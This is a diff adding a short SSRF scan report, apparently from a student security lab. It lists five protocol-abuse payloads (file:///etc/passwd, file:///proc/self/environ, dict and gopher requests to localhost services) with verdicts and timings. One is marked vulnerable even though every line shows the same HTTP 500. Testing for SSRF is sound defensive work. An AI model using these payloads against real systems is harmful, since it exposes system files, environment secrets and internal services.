@@ -1,0 +1,12 @@
+SSRF Analysis Report
+Roll No: 727823TUCY014
+Scan Time: 2026-03-29 14:52:28
+Total Payloads: 5
+Vulnerable: 1
+Possible: 0
+
+[VULNERABLE] protocol_abuse | file:///etc/passwd | HTTP 500 | 4.28ms
+[NOT_VULNERABLE] protocol_abuse | file:///etc/hosts | HTTP 500 | 2.3ms
+[NOT_VULNERABLE] protocol_abuse | file:///proc/self/environ | HTTP 500 | 1.77ms
+[NOT_VULNERABLE] protocol_abuse | dict://localhost:11211/stats | HTTP 500 | 1.45ms
+[NOT_VULNERABLE] protocol_abuse | gopher://localhost:25/_HELO%20localhost | HTTP 500 | 1.51ms
